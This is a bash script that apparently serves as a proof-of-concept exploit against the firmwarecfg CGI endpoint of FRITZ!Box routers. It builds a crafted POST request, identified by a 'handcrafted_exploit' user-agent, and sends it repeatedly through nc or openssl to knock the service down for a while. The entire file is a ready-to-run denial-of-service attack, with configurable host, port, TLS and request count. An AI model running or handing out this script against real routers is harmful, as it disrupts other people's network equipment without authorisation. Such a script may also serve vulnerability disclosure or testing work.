#! /bin/bash 
#####################################################################################
#                                                                                   #
# create the HTTP request                                                           #
#                                                                                   #
#####################################################################################
post_request()
{
	local host="$1"
	cat <<EOT
POST /cgi-bin/firmwarecfg HTTP/1.1
User-Agent: handcrafted_exploit/0.1 (shell)
Accept: */*
Host: $1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

reboot
EOT
}
#####################################################################################
#                                                                                   #
# take firmwarecfg on the specified FRITZ!Box router down for a while               #
#                                                                                   #
#####################################################################################
host="${1:-192.168.178.1}"
port="${2:-80}"
ssl="${3:-0}"
requests="${4:-3}"
#####################################################################################
#                                                                                   #
# take firmwarecfg on the specified FRITZ!Box router down for a while               #
#                                                                                   #
#####################################################################################
count=0
echo "Start was at $(date) ..."
start=$(date +%s)
while [ $count -lt $requests ]; do
	if [ $ssl -eq 0 ]; then
		post_request "$host" | nc -q 1 -C -v -w 2 $host $port
		rc=$?
	else
		post_request "$host" | openssl s_client -connect $host:$port -showcerts -debug -msg -state -tls1_2 -no_ign_eof 
		rc=$?
	fi
	count=$(( count + 1 ))
	echo "Sent request number $count"
	[ $rc -ne 0 ] && break
	[ $ssl -eq 1 ] && [ $count -ge 15 ] && break # parallel SSL connections are limited
done
duration=$(( $(date +%s) - start ))
echo -n "Summary: sent $count requests to $host:$port (with"
[ $ssl -eq 0 ] && echo -n "out"
echo " TLS), finished at $(date), send duration was $duration seconds"
